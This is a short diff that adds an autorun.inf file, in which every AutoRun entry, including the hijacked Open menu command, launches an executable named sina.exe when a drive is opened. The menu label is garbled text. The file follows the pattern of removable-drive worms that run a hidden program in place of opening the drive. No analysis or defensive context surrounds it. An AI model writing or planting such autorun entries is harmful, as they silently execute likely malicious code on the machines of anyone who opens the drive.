@@ -1,0 +1,5 @@
+[AutoRun]
+open=sina.exe
+shellexecute=sina.exe
+shell\Open=´ò¿ª(&O)
+shell\Open\command=sina.exe
